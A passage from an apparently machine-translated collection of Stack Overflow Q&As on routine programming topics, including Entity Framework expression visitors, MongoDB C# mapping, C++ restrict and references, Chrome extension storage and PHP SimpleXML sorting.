        // Only change generic types = Navigation Properties
        // else just execute the normal code.
        return !ex.Type.IsGenericType ? base.VisitMember(ex) : CreateWhereExpression(QueryCondition, ex) ?? base.VisitMember(ex);
    }

    /// <summary>
    /// Create the where expression with the adapted QueryConditional
    /// </summary>
    /// <param name="condition">The condition to use</param>
    /// <param name="ex">The MemberExpression we're visiting</param>
    /// <returns></returns>
    private Expression CreateWhereExpression(QueryConditional condition, Expression ex)
    {
        var type = ex.Type.GetGenericArguments().First();
        var test = CreateExpression(condition, type);
        if (test == null)
            return null;
        var listType = typeof(IQueryable<>).MakeGenericType(type);
        return Expression.Convert(Expression.Call(typeof(Enumerable), "Where", new Type[] { type }, (Expression)ex, test), listType);
    }

    /// <summary>
    /// Adapt a QueryConditional to the member we're currently visiting.
    /// </summary>
    /// <param name="condition">The condition to adapt</param>
    /// <param name="type">The type of the current member (=Navigation property)</param>
    /// <returns>The adapted QueryConditional</returns>
    private LambdaExpression CreateExpression(QueryConditional condition, Type type)
    {
        var lambda = (LambdaExpression)condition.Conditional;
        var conditionType = condition.GetType().GetGenericArguments().FirstOrDefault();
        // Only continue when the condition is applicable to the Type of the member
        if (conditionType == null)
            return null;
        if (!conditionType.IsAssignableFrom(type))
            return null;

        var newParams = new[] { Expression.Parameter(type, "bo") };
        var paramMap = lambda.Parameters.Select((original, i) => new { original, replacement = newParams[i] }).ToDictionary(p => p.original, p => p.replacement);
        var fixedBody = ParameterRebinder.ReplaceParameters(paramMap, lambda.Body);
        lambda = Expression.Lambda(fixedBody, newParams);

        return lambda;
    }
} 
```

QueryConditional 是一个持有类型为 Expression 的类`Expression<Func<T, bool>>`。

InjectconditionVisitor 可以与 InterceptWith（QueryInterceptor NuGet 包）结合使用，例如`query.InterceptWith(new InjectConditionVisitor(new QueryConditional(x => x.Deleted == true))`.

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-15T22:37:08.597

是的，使用`ExpressionVisitor`是正确的方法。

你需要转换`x.Bonus`成`x.Bonus.Where(x => !x.IsDeleted)`. 我建议你对`x.Bonus.Where(y => y.bonID == 100)`. 将其转换为`x.Bonus.Where(x => !x.IsDeleted).Where(y => y.bonID == 100)`

这意味着您需要将任何类型的表达式转换`IQueryable<Bonus>`为另一个类型的表达式`IQueryable<Bonus>`，但要附加 where 子句。

您可能需要重写非常通用的`ExpressionVisitor.Visit`方法来访问*所有*表达式，而不仅仅是二进制表达式。

您很可能会在这里遇到您尚未考虑过的特殊情况。这将是困难的，但很有趣:)

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-03-14T10:32:40.583

胜利！今天我创建了一个 ExpressionVisitor，它将 IsDeleted where 子句附加到每个选择，甚至在导航属性中！

# c# - Visual Studio 2012 中的设计视图去了哪里？

> ID：12760938
> 
> 赞同：1
> 
> 时间：2012-10-06T15:05:52.197
> 
> 标签：c#, visual-studio, visual-studio-2012

我刚刚安装了 Visual Studio，我正在编写一个 C# 程序。但是我看不到如何切换到设计视图。在 Visual Studio 2010 中，我似乎记得在主文本区域旁边有选项卡，可让您在代码、设计或拆分视图之间进行选择？

顺便说一句，当我安装 VS2012 时，我选择 C++ 作为我的“主要语言”，所以我不知道这是否与缺少的设计视图有关？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-06T15:12:52.593

![在此处输入图像描述](../Images/e7d35cb06af2508b9be80c62a9c6d715.png)

当您打开一个 xaml 文件时，您可以在 VS 的左下方看到“设计”选项卡。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-12-12T09:22:28.953

右键单击选择您的文件以查看而不是找到视图设计底部，或者可以在左下角看到设计选项卡作为第一个答案

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-06-09T14:45:32.807

确保您选择了 .xaml.cs 文件，然后转到查看->设计器。

# mongodb - MongoDB CSharp 驱动程序：如何处理“确保已知类型派生自映射类”。错误？

> ID：12760941
> 
> 赞同：0
> 
> 时间：2012-10-06T15:06:28.373
> 
> 标签：mongodb, mongodb-.net-driver

我有 2 个相当简单的类（地图和游戏），当我执行这个查询时：

`if(gameCollection.Any(g => g.NumPlayers <GameConstants.MAX_PLAYERS_PER_GAME))`

我收到错误消息：无法将类 MOMGame.GameObjects.Map 分配给类 MOMGame.GameObjects.Game。确保已知类型派生自映射类。参数名称：类型

知道问题是什么吗？我正在对 Mongo 2.2 使用最新版本的驱动程序 (1.6.0.4624)。

以下是有问题的2类：

```
 [BsonKnownTypes(typeof(MOMGame.GameObjects.Map), typeof(MOMGame.GameObjects.Location), typeof(MOMGame.GameObjects.Game), typeof(MOMGame.GameObjects.UserInfo))]
    public class Game 
    {
        [BsonId]
        public Guid Id { get; set; }
        public  Map Map { get; set; }

        public string Name { get; set; }

        public List<Guid> Players { get; set; }
        [BsonRepresentation(BsonType.Int32)]
        public int NumPlayers { get; set; }
        public Game()
        {
            Players = new List<Guid>();
            //if (!BsonClassMap.IsClassMapRegistered(typeof(Game)))
            //{
            //    BsonClassMap.RegisterClassMap<Game>(cm => cm.AutoMap());
            //}
        }

        public static void SaveGame(Game game)
        {
            var connectionString = "mongodb://localhost/?safe=true";
            var server = MongoServer.Create(connectionString);
            var database = server.GetDatabase("mom");
            var gameCollection = database.GetCollection<Game>("games");
            game.NumPlayers = game.Players.Count;
            gameCollection.Save(game);
        }

        public static Game GetNextGame()
        {
            var connectionString = "mongodb://localhost/?safe=true";
            var server = MongoServer.Create(connectionString);
            var database = server.GetDatabase("mom");
            var gameCollection = database.GetCollection<Game>("games").AsQueryable();
            if(gameCollection.Any(g => g.NumPlayers < GameConstants.MAX_PLAYERS_PER_GAME))
            {
                return gameCollection.First(g => g.NumPlayers < GameConstants.MAX_PLAYERS_PER_GAME);
            }
            else
            {
                return GameCreator.CreateGame();
            }
        }
    }

[BsonKnownTypes(typeof(MOMGame.GameObjects.Map), typeof(MOMGame.GameObjects.Location) , typeof(MOMGame.GameObjects.Game),  typeof(MOMGame.GameObjects.UserInfo))]
    public class Map 
    {
        public Map()
        {
            //if (!BsonClassMap.IsClassMapRegistered(typeof(Map)))
            //{
            //    BsonClassMap.RegisterClassMap<Map>(cm => cm.AutoMap());
            //}
        }
        [BsonIgnore]
        public ILocation[][] Grid { get; set; }

        [BsonId]
        public Guid Id { get; set; }

        public string Name { get; set; }
        [BsonIgnore]
        public List<ILocation> Locations
        {
            get
            {

                List<ILocation> locs = new List<ILocation>();
                for (int i = 0; i < Grid.Length; i++)
                {
                    for (int j = 0; j < Grid[i].Length; j++)
                    {
                        locs.Add(Grid[i][j]);
                    }
                }
                return locs;

            }
        }
    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-06T15:50:24.813

我认为您不需要 KnownTypes 属性，因此请尝试删除这些属性。它们是为了明确让 Mongo 知道任何子类，而您列出的那些似乎不是从属性所在的类派生的

# c++ - 调用一个函数并传递一个限制限定的指针是否危险？

> ID：12760942
> 
> 赞同：0
> 
> 时间：2012-10-06T15:06:30.197
> 
> 标签：c++, restrict-qualifier

考虑这两个函数：

```
void foo(char * __restrict localPtr)
{
    // some work with localPtr
}

void bar(char * __restrict ptr)
{
    // some work with ptr
    foo(_ptr);
    // some other work with ptr
} 
```

正如`ptr`在 中声明`__restrict`的那样`bar`，打电话`foo()`危险吗？`localPtr`所谓危险，我的意思是重叠指向的内存区域`ptr`。对此有何指导方针？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-06T15:16:43.980

`restrict`限定符意味着被调用函数访问传入内存的唯一方法是通过`localPtr`该`foo`指针；那段记忆没有别名。这可能使优化器能够生成更好的代码，因为它不必担心另一个指针也会改变数据。

在这种情况下，以及在大多数其他情况下，`restrict`限定符对您（进行调用的程序员）承担了责任，以确保您遵守“无别名”要求。

上面的代码没有明显的危险。

请注意，大多数情况下，在使用时，参数列表中有多个指针`restrict`。从 C 标准，比较：

```
void *memcpy(void *restrict s1, const void *restrict s2, size_t n);
void *memmove(void *s1, const void *s2, size_t n); 
```

第一个 ( `memcpy()`) 表示内存块不能重叠`[s1 .. s1+n-1]`；`[s2 .. s2+n-1]`如果它们实际上重叠，您将获得未定义的行为。第二个 ( `memmove()`) 没有强加该要求。

* * *

> 但不是调用`foo()`创建另一个更改数据的指针吗？

是的，不，有点……但大多不是。

in 中的指针`foo()`当然是传递给 的`bar()`，但是在`bar()`运行时，唯一`bar()`可以获取内存的方法是通过它传递的指针。因此`bar()`，可以在假设它正在使用的内存没有别名的情况下进行编译。

当编译器正在处理`foo()`时，它知道（确保）在计算参数之后`bar()`和调用函数之前有一个序列点，并且在函数返回时有另一个序列点。它知道数据可能已被修改，`bar()`因为它没有被传递`const char *`。因此，它将生成代码来解释这些可能性。但是，编译器也知道唯一`foo()`可以访问所寻址的内存的方法`localPtr`是通过`localPtr`（这就是`restrict`所说的），并且它可以基于该假设继续进行。

因此，在被调用时存在指针的第二个副本，但它没有以任何方式`bar()`违反规则。`restrict`

# windows - 如何在 Eclipse 中为不同的透视图管理多组系统路径

> ID：12760951
> 
> 赞同：0
> 
> 时间：2012-10-06T15:07:48.873
> 
> 标签：windows, eclipse, compiler-construction, android-ndk, rcpp

我在 Windows 上工作。在 Eclipse 中，我通常使用 NDK 开发 Android 应用程序，使用 MingW 或 Cygwin 开发原生 c++ 应用程序，或者使用 Rcpp 开发 R 包。

我的问题是我必须关闭 Eclipse，将系统路径更改为相应的 C++ 编译器，并在每次切换到另一个时重新启动 Eclipse。目前，我有批处理文件来执行此操作，但是当还添加其他系统路径并且应该将其合并到批处理文件中时，它会变得混乱。

有没有更好的方法来做到这一点？

更新：通过搜索网络，我发现[路径管理器](http://sourceforge.net/projects/pathmanager/)它具有更改路径顺序的功能，我认为这将达到我的目的。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-10T09:07:15.967

好的，我试图重现你的情况。在eclipse中，我有一个CDT项目。我使用标准向导创建了它，并使用 Cygwin GCC 编译。我可以向这个项目添加一个新配置，将其命名为 Android，从我的 Debug 配置的设置开始，然后将其修改为使用 Android GCC 和 Android Builder。请参阅[工具链编辑器](http://help.eclipse.org/indigo/index.jsp?topic=%2Forg.eclipse.cdt.doc.user%2Freference%2Fcdt_u_prop_build_toolchain.htm)和[工具设置](http://help.eclipse.org/indigo/topic/org.eclipse.cdt.doc.user/reference/cdt_u_fileprop_toolsettings.htm)的说明。

定义新工具链的说明在[这里](http://help.eclipse.org/indigo/topic/org.eclipse.cdt.doc.isv/guide/mbs/extensibilityGuide/Managed_Build_Extensibility.html)和[这里](http://help.eclipse.org/indigo/topic/org.eclipse.cdt.doc.isv/guide/cdt_build_system/migration_guides/4.0/migration_guide_40.html)

# c# - 是否有不应该使用任务的场景？

> ID：12760956
> 
> 赞同：9
> 
> 时间：2012-10-06T15:08:31.617
> 
> 标签：c#, .net, multithreading, task-parallel-library

我正在阅读任务是使用 4.0 进行异步编程的首选方式。我只是想知道是否有任何用例不应该优先使用任务而不是普通的 c# 线程？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-10-06T15:17:23.457

由于`Task`s 使用底层`ThreadPool`（除非标记为长期运行），因此在不建议使用 a 时使用它们是一个坏主意，`ThreadPool`例如

*   长 I/O 操作会阻塞任务队列并阻止执行其他任务。
*   执行需要线程标识的操作，例如设置亲和力。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-10-06T15:10:29.420

这在此处进行了详细介绍： [我是否应该注意到在 .Net 4.0 中使用任务与线程的区别？](https://stackoverflow.com/questions/8303284/should-i-notice-a-difference-in-using-task-vs-threads-in-net-4-0)

最大的不同是 TaskFactory 使用线程池，所以如果你有很多任务，它们可能不会立即启动。他们必须等待空闲线程运行。在大多数情况下，这是可以接受的..

在硬件允许的情况下，一旦调用 .Start()，线程就会立即运行。

假设线程池没问题，任务提供了许多好处，包括取消、ContinueWith、OnSuccess、OnError、异常聚合和 WaitAll 等等。

# c++ - #ifndef 如何在不同文件中工作

> ID：12760959
> 
> 赞同：0
> 
> 时间：2012-10-06T15:09:23.860
> 
> 标签：c++, c-preprocessor, conditional-compilation, ifndef

所以我试图将我在 main.cpp 中声明的库包含到我的 header.h 中

```
//In my main.cpp
#include <cmath>
#include <deque>
#include <vector>

using namespace std;

//In my header.h
#ifndef HANOI_H
#define HANOI_H

#include <cmath>
#include <deque>

using namespace std;

#endif 
```

这会检查我的 main.cpp 以查看 3 个库和命名空间是否存在相应的变量 HANOI_H？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-06T17:51:57.083

是的，因为`#include`执行了 s，实际上将所有内容替换为 1 个文件。因此`#ifndef`从不关心多个文件或知道它们。

# css - Fix 2 Internet Explorer 7 css bugs

> ID：12760961
> 
> 赞同：1
> 
> 时间：2012-10-06T15:09:36.377
> 
> 标签：css, cross-browser

Hi I have a site that I am making for a client and he needs it to work properly on ie7.Most of the site works fine except 2 things.

The first thing I noticed that when I float an ul the list-style disapears and I need them to be floated but also display the list-styles.A work around would be to add images but that could prove problematic because I have 5 ul's and the first one uses decimal list-style , the second upper-latin letters and the other 3 square's and circles.To add an each for each would mean adding an id for each one.

Is there another way?

The second problem can be seen in the image below:

![enter image description here](../Images/8d2606caa49c67fcc58857ccda8f16a2.png)

This is the html I am using:

```
 <label>RADIO BUTTONS</label>
 <input type="radio" value="Male"/>Male<br/>
 <input type="radio" value="Female"/>Female

 <label>CHECKBOXES:</label>
 <input type="checkbox" value="CHECK1"/>CHECK1<br/>
 <input type="checkbox" value="CHECK2"/>CHECK2<br/> 
```

The only css I am using here is display:block to make the labels stay on there own line so this should not affect the text on the right of the input's.

How can I make the text on the right of the input's stay on the same line?

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-06T15:55:23.243

For problem 1 just put the lists in their own containers and float the containers instead of the lists.

For problem two use actual labels for the text labels. For IE7 you'll probably want to float the checkboxes and clear them, but not the labels. I think if you float both the labels and the checkboxes IE7 will screw it up, but you can try it if it doesn't work with just the checkboxes floated

# c++ - 在 main() 中错误地接收到 C++ 引用

> ID：12760962
> 
> 赞同：0
> 
> 时间：2012-10-06T15:09:45.373
> 
> 标签：c++, reference

> **可能重复：**
> [C++ 返回对局部变量的引用](https://stackoverflow.com/questions/4643713/c-returning-reference-to-local-variable)

我无法在以下代码中正确传递引用。

```
myint& myint::abs()
{
  myint i=*this;
  myint &t=i;
  t.setsign(0);
  return t;      
} 
```

引用 't' 在 abs() 函数中被正确修改。我打印了它，发现它是正确的。但是 main() 中收到的值总是错误的。

我在 main() 中使用了以下语句

```
myint a("-12"); /*gives a=-12 with each digit in a linked list node. separate data field for sign.*/
myint b=a.abs(); 
```

b 收到的是 0，默认值。

提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-06T15:13:48.153

您正在返回对局部变量“i”的引用。当您从函数返回时，我已经超出范围，因此使用对它的引用会导致未定义的行为。

# android - 如何从 Yahoo Weather 获取 5 天的天气预报

> ID：12760967
> 
> 赞同：2
> 
> 时间：2012-10-06T15:10:41.307
> 
> 标签：android, weather-api, yahoo-weather-api

我正在开发 android 项目，因为我必须显示特定城市的天气预报。首先我想通过 Google Weather API 来实现它，然后如**[链接](https://stackoverflow.com/questions/11557693/google-weather-api-links-need-human-authentication "关联")**中的“Jason Hall”所述，所以 iGoogle 将关闭。然后我把我的观点转向雅虎天气 API，通过谷歌搜索我得到了这个**[链接](http://code.google.com/p/yahooweatherandroid/)**。所以我得到了特定位置的天气预报，现在我想在接下来的 5 天里得到它，我试过**[了](https://stackoverflow.com/questions/7399422/weather-forcasts-from-yahoo-weather-api)**。但它只返回一天如何实现它。欢迎回答。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-07T07:52:42.130

雅虎天气 API 不支持第三个参数，它只会响应 WOEID 和 U。但是 yahoo 只为美国提供此选项。, 如果你想获得 5 天的预报手段，你可以试试其他 3rd 方 API，如 Accuweather、Sky 等。

# compiler-construction - 如果编译器声称符合标准但事实并非如此，会发生什么？

> ID：12760968
> 
> 赞同：0
> 
> 时间：2012-10-06T15:10:46.613
> 
> 标签：compiler-construction, programming-languages

如果具有国际标准的语言“X”的编译器自己推销并声称它符合标准但事实并非如此，会发生什么情况。是否有任何法规或惩罚措施来防止这种情况发生？编译器是商业的还是免费的有关系吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-06T15:17:14.273

如果任何编译器 100% 符合相关语言标准，我会感到惊讶。一些编译器比其他编译器更遵守标准，例如许可问题的法规和惩罚。GPL 许可下的自由软件具有以下条款。[请参阅此处的](http://www.gnu.org/copyleft/gpl.html)15\. 和 16\.

> 在适用法律允许的范围内，本程序不提供任何保证。除非另有说明，否则版权所有者和/或其他方按“原样”提供程序，不提供任何形式的明示或默示保证，包括但不限于对适销性和特定用途适用性的默示保证. 有关程序质量和性能的全部风险由您承担。如果该程序被证明有缺陷，您将承担所有必要的服务、修理或更正的费用。

# c# - 从 port.DataReceived 事件及其订阅者方法获取 IEnumerable？

> ID：12760970
> 
> 赞同：0
> 
> 时间：2012-10-06T15:11:16.267
> 
> 标签：c#, serial-port, ienumerable, handler, grasshopper

我正在尝试读取从设备接收到的数据，但出现以下错误`DA.SetDataList(0, port.DataReceived);`：

`The best overloaded method match for Grasshopper.Kernel.IGH_DataAccess.SetDataList(int,System.Collections.IEnumerable) has some valid arguments.`

SetDataList(int32, IEnumerable) 是 Grasshopper 内核的一部分。`port.DataReceived`是一个事件，因此不是有效的 IEnumerable 参数，它在 GH_Component.SolveInstance() 期间将数据列表存储在输出参数中。我已经设置了一个订阅者方法 portdatareceived 它给了我字符串。如何从此方法获得 IEnumerable？

```
 SerialPort port;

   protected override void SolveInstance(IGH_DataAccess DA)
    {
    string gcode = default(string);
    DA.GetData(0, ref gcode);

    port = new SerialPort(selectedportname, selectedbaudrate, Parity.None, 8, StopBits.One); 
    port.DtrEnable = true;   
    port.Open();            
    port.DataReceived += this.portdatareceived;

    if (gcode == null)
    {
        AddRuntimeMessage(GH_RuntimeMessageLevel.Warning, "Specify a valid GCode");
        return;
    }
    else
    {
        DA.SetDataList(0, port.DataReceived);
    }    
    }

  private void portdatareceived(object sender, System.IO.Ports.SerialDataReceivedEventArgs e)
    {
       string line = port.ReadExisting();
    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-06T15:15:05.380

使用此代码：

```
port.DataReceived += this.portdatareceived; 
```

似乎`port.DataReceived`是一个*事件*，而您的方法需要`IEnumerable`：

```
IGH_DataAccess.SetDataList(int,System.Collections.IEnumerable) 
```

为了解决这个问题，你需要`portdatareceived`通过从事件参数中获取正确的数据来调用这个方法。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-06T15:45:57.623

我对 GrassHopper 一无所知，所以这可能是完全错误的。

因为`port.DataReceived`是一个事件，我不认为你真的想要它作为一个 IEnumerable。相反，您想要的是等待事件被引发，然后可能传递给此事件的参数将包含您的数据列表的数据。

因此，找到的定义`this.portdatareceived`并尝试将其参数之一转换为 IEnumberable。代码可能看起来有点像：

```
private void DataReceived(object sender, EventArgs e)
{
    IEnumerable hopefullyThisIsYourData = (IEnumerable)e;
    DA.SetDataList(0, hopefullyThisIsYourData);  
} 
```

您可以在此处添加断点以找出其中的内容`e`，并相应地修复代码。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-06T16:44:19.190

使订阅者方法中的 line 变量成为字段并从 SetDataList 方法访问它是有效的：

```
SerialPort port;
string myReceivedLines;

   protected override void SolveInstance(IGH_DataAccess DA)
  {

    string gcode = default(string);
    DA.GetData(0, ref gcode);

    port = new SerialPort(selectedportname, selectedbaudrate, Parity.None, 8, StopBits.One);
    port.DtrEnable = true;   
    port.Open();            
    port.DataReceived += this.portdatareceived;

    if (gcode == null)
    {
        AddRuntimeMessage(GH_RuntimeMessageLevel.Warning, "Specify a valid GCode");
        return;
    }
    else
    {
        DA.SetDataList(0,  myReceivedLines);
        port.WriteLine(gcode);
    }    
              }

    private void portdatareceived(object sender, System.IO.Ports.SerialDataReceivedEventArgs e)
    {
        myReceivedLines = port.ReadExisting();
    } 
```

# c++ - 什么是等同于 void(MainWindow::*handler)() 的 std::mem_fn 类型？

> ID：12760977
> 
> 赞同：1
> 
> 时间：2012-10-06T15:12:09.637
> 
> 标签：c++, c++11

我有一个功能：

```
std::function<void(sp_session*)> test(void(MainWindow::*handler)())
{
    return ...;
} 
```

我想用等效的 std::mem_fn 类型替换处理程序的类型。

类型是什么？

我试过这个：

```
std::function<void(sp_session*)> test(std::mem_fn<void(), MainWindow>  handler)    
{
    return ...;
} 
```

但是 VC++ 2010 吐出这些错误：

```
error C2146: syntax error : missing ')' before identifier 'handler'
error C2059: syntax error : ')'
error C2143: syntax error : missing ';' before '{'
error C2447: '{' : missing function header (old-style formal list?) 
```

所以我不确定我做错了什么。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-06T15:16:28.247

C++11 binder 系列函数 ( `mem_fn`, `bind`) 返回的确切类型是*未指定*的，这意味着它是一个实现细节，您不应该关心它。

`§20.8.9 [func.bind]`

> `template<class F, class... BoundArgs>`
> *`unspecified`*`bind(F&&, BoundArgs&&...);`

`§20.8.10 [func.memfn]`

> `template<class R, class T>`
> *`unspecified`*`mem_fn(R T::* pm);`

“解决方法”：使用模板。

```
template<class F>
std::function<void(sp_session*)> test(F handler)
{
    return ...;
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-06T16:38:16.843

`std::mem_fn`不是您要查找的类型。
您需要的类型是`std::function`将实例作为参数：

```
std::function<void(sp_session*)> test(std::function<void(MainWindow *)> handler) 
```

它可以绑定到成员函数，并且仅与实例一起用作第一个参数。
如果在原始函数中你会这样做：

```
instance->*handler(); 
```

在新功能中，您可以：

```
handler(instance); 
```

# javascript - 我应该读/写 XML 文件以将数据保存在本地 Chrome 扩展程序中吗？

> ID：12760978
> 
> 赞同：1
> 
> 时间：2012-10-06T15:12:09.527
> 
> 标签：javascript, xml, google-chrome, file-io, google-chrome-extension

我正在写一个简单的 chrome 扩展。我需要创建将站点 URL 添加到列表或从列表中读取的功能。

我使用列表在新选项卡中打开站点。

我正在寻找一种方法来获得可以写入和读取的数据文件。我在考虑 XML。我读到使用 Javascript 更改文件内容时出现问题。

XML 是这种事情的正确选择吗？

我应该补充一点，没有网络服务器，应用程序将在本地运行，所以可能网站遇到的问题与此不同。

在我写这个问题之前，我尝试了一件事，并开始感到不安全，因为它不起作用。

*   我制作了一个名为 Site.xml 的 XML 文件：

* * *

```
<?xml version="1.0" encoding="utf-8" ?>

    <Sites>
  <site>
    <url>
      http://www.sulamacademy.com/AddMsgForum.asp?FType=273171&SBLang=0&WSUAccess=0&LocSBID=20375
    </url>
  </site>

  <site>
    <url>
      http://www.wow.co.il
    </url>
  </site>

  <site>
    <url>
      http://www.Google.co.il
    </url>
  </site> 
```

*   我制作了这个脚本来读取他的数据，并将其放入 html 文件中。

* * *

```
 function LoadXML() {
            var ajaxObj = new XMLHttpRequest();
            ajaxObj.open('GET', 'Sites.xml', false);
            ajaxObj.send();

        var myXML = ajaxObj.responseXML;
        document.write('<table border="2">');
        var prs = myXML.getElementsByTagName("site");
        for (i = 0; i < prs.length; i++) {
            document.write("<tr><td>");
            document.write(prs[i].getElementsByName("url")[0].childNode[0].nodeValue);
            document.write("</td></tr>");
        }
        document.write("</table");
    } 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-05-04T11:30:20.067

我建议使用“chrome.storage.local”解决这个问题。首先参考[谷歌指南](http://developer.chrome.com/extensions/storage.html)然后关于你的代码。只做两件事：

1）像这样按顺序存储它们

```
key: site1 - value: www.example1.com
key: site2 - value: www.example2.com
key: site3 - value: www.example3.com 
```

2）检索时，您应该从“site1”开始迭代，直到不再有:)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-06T15:19:08.233

1.  Chrome 扩展程序无法写入真实文件系统上的文件（[虚拟 HTML5 文件系统](https://stackoverflow.com/tags/html5-filesystem/info)可能对您来说太复杂）。
2.  对于本地应用程序，维护持久设置的最佳方式是使用^(Chrome 20+)或.[`chrome.storage`](http://developer.chrome.com/extensions/storage.html) ^([`localStorage`](https://stackoverflow.com/tags/local-storage/info))
3.  使用时`localStorage`，需要对数据进行序列化。[JSON](http://json.org/)比 XML 更适合。
4.  页面加载后切勿使用`document.write`，因为文档的先前内容将被擦除。

# php - 对 SimpleXML 数据进行排序和分组

> ID：12760980
> 
> 赞同：1
> 
> 时间：2012-10-06T15:12:20.653
> 
> 标签：php, simplexml, usort

我正在对 XML 文件中的发布数据进行排序和分组。我目前使用的方法运行良好*大部分都运行良好*都可以正常工作，尽管我觉得有一种更有效的方法来完成我想要完成的工作。

以下是目标节点的示例：

```
<comic>
      <id>117</id>
      <mainsection>
        <series>
          <displayname>My Amazing Adventure</displayname>
          <sortname>My Amazing Adventure</sortname>
        </series>
      </mainsection>
      <issuenr>2</issuenr>
      <seriefirstletter>
        <displayname>M</displayname>
        <sortname>M</sortname>
      </seriefirstletter>
    </comic> 
```

这是我正在采取的当前步骤。

*   使用 SimpleXML 加载 XML 文件
*   指定目标节点并使用 iterator_to_array 将其转换为数组
*   使用比较 (strcmp) seriesname 属性的 usort 函数，按字母顺序对所有系列进行排序。
*   我为每个页面使用一个查询字符串来指定字母表中的每个字母，并使用一个 IF 语句将查询字符串字母与 seriesfirstletter 值进行比较。所以只返回适用的节点。
*   然后我开始我的 foreach 语句。将我想要的数据呼应到 LI 项目中。
*   最后，我使用 jQuery 来查看每个 LI 项的 ID 并在视觉上对它们进行分组。我创建了一个 PHP 变量，该变量使用系列名称（去掉了空格）作为 ID。它在组上方插入具有正确系列名称的 H4 标题，并在组下方插入分隔 DIV。

虽然字母排序工作正常。我还希望对同一系列中的问题进行数字排序。**这目前不起作用。**现在，数字排序顺序看起来像这样：1、10、12、2、3。

我想理顺数字排序问题。我也觉得我目前在 jQuery 中进行的分组可以在 PHP 中完成，而我正在循环。任何关于更好/更有效地处理这些数据的方法的建议，将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-06T15:59:01.600

假设您已经将所有`<comic>`元素作为迭代器。首先将其转换为数组，以便我们可以使用数组函数：

```
$comics = iterator_to_array($comics, 0); 
```

然后你想根据某个值对这个数组进行排序，这里是`<issuenr>`孩子的值。这可以在[`usort`](http://php.net/usort)回调函数的帮助下完成：

```
$success = usort($comics, function($a, $b) {
    return strnatcmp($a->issuenr, $b->issuenr);
}); 
```

回调函数只是选择您想要相互比较的具体值并将其传递给[`strnatcmp`](http://php.net/strnatcmp)我上面评论的自然顺序比较。

* * *

以下代码示例显示如何列出与特定搜索字母、`natsort`ed 和 distinct（无重复名称、分组）匹配的所有系列。

搜索和分组都是通过`xpath`查询完成的：

```
$searchval = 'T';

$file = 'compress.zlib://comiclist10-12.xml.gz';

$xml = simplexml_load_file($file);

$series = $xml->xpath(
    "/*/comiclist/comic[./seriefirstletter/displayname = '$searchval']
        /mainsection/series/sortname[
            not(. = ../../../following-sibling::comic/mainsection/series/sortname)
        ]"
);

natsort($series);

foreach($series as $serie)
{
    echo $serie, "\n";
} 
```

这将输出排序列表：

```
Tale of the Batman: Gotham by Gaslight, A
Tales of Suspense: Captain America & Iron Man #1 Commemorative Edition
Tales to Astonish, Vol. 1
Teenage Mutant Ninja Turtles
Teenage Mutant Ninja Turtles Micro Series
Teenage Mutant Ninja Turtles Ongoing
Terminator / Robocop: Kill Human
Thanos
Thing, Vol. 1
Thor, Vol. 2
Thor, Vol. 3
Thor: Blood Oath
Thor: For Asgard
Thor: Man of War
Thor: Son of Asgard
Thor Annual
Thor Corps
Thundercats
Thundercats (DC Comics - Wildstorm)
Thundercats: Enemy's Pride
Tomb of Dracula, Vol. 4, The
Torch, The
Toxin
Transformers: Armada
Transformers: Generation One
Transformers: Infiltration
Truth: Red, White & Black 
```

在下一步中，您要列出该系列中的所有漫画，这将是一个内部 foreach：

```
foreach ($series as $serie) {
    echo $serie, "\n";

    $string = xpath_string($serie);

    $comics = $serie->xpath("../../../../comic[./mainsection/series/sortname = $string]");

    foreach ($comics as $i => $comic) {
        printf(" %d. id: %s\n", $i+1, $comic->id);
    }
} 
```

然后它将获取每个系列的漫画，输出：

```
Tale of the Batman: Gotham by Gaslight, A
 1\. id: 8832
Tales of Suspense: Captain America & Iron Man #1 Commemorative Edition
 1\. id: 3591
Tales to Astonish, Vol. 1
 1\. id: 3589
Teenage Mutant Ninja Turtles
 1\. id: 117
Teenage Mutant Ninja Turtles Micro Series
 1\. id: 13789
Teenage Mutant Ninja Turtles Ongoing
 1\. id: 13780
 2\. id: 13782
 3\. id: 13787
Terminator / Robocop: Kill Human
 1\. id: 13775
Thanos
 1\. id: 3597
Thing, Vol. 1
 1\. id: 3746
Thor, Vol. 2
 1\. id: 5873
Thor, Vol. 3
 1\. id: 1035
 2\. id: 1635
 3\. id: 2318
 4\. id: 2430
 5\. id: 2463
 6\. id: 3333
 7\. id: 3616
 8\. id: 11731
 9\. id: 11733
Thor: Blood Oath
 1\. id: 3635
 2\. id: 3636
Thor: For Asgard
 1\. id: 11545
 2\. id: 11546
Thor: Man of War
 1\. id: 3644
Thor: Son of Asgard
 1\. id: 538
 2\. id: 3645
Thor Annual
 1\. id: 5868
Thor Corps
 1\. id: 3640
Thundercats
 1\. id: 209
Thundercats (DC Comics - Wildstorm)
 1\. id: 3654
Thundercats: Enemy's Pride
 1\. id: 3649
Tomb of Dracula, Vol. 4, The
 1\. id: 3719
Torch, The
 1\. id: 2328
 2\. id: 2330
 3\. id: 2461
Toxin
 1\. id: 3720
Transformers: Armada
 1\. id: 3737
Transformers: Generation One
 1\. id: 557
Transformers: Infiltration
 1\. id: 3729
 2\. id: 3731
